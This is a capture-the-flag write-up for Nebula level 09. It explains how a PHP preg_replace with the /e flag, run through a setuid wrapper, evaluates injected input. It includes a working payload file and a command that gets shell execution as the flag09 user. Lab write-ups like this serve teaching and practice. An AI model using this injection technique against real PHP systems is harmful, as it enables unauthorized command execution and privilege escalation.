# Level09

`vulnerable.php` has a wrapper C program, which has the setuid bit. The objective, therefore, is to get arbitrary code execution through the PHP script, since it will execute as user `flag09`. The exploitable part of the program is in the `markup` function:

```php
function markup($filename, $use_me)
{
    $contents = file_get_contents($filename);

    $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
    $contents = preg_replace("/\[/", "<", $contents);
    $contents = preg_replace("/\]/", ">", $contents);

    return $contents;
}
```

The first `preg_replace` will match the pattern `[email (...)]`, capturing anything inside of the round brackets. Since the expression is followed by the `/e` flag, it will pass captured output to the second parameter, and **evaluate it as PHP code** (you can see where this is going). The second parameter is `spam("\\2")`, which simply sends the captured output to the `spam` function. We don't really care what `spam` does, we simply want to use the captured output to execute code.

Our job is to craft a payload where there is code inside of the captured group, which will then be evaluated before passing it to the `spam` function. As the captured group is inside of double quotes, we can't just pass code as-is, we must wrap it inside of `${}`, since variables are still evaulated within strings.

```bash
level09@nebula:/home/flag09$ echo '[email ${`$use_me`}]' > ~/exploit.txt 
```

The first `${}` will cause the inside expression to be evaluated as PHP code. Then, there is an unused parameter called`$use_me$`, which comes from `argv[2]`, which we can use to input arbitrary commands. Backticks tell PHP to execute the `$use_me` through the `shell_exec` function.

```bash
level09@nebula:/home/flag09$ ./flag09 ~/exploit.txt getflag
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account
 in /home/flag09/flag09.php(15) : regexp code on line 1
```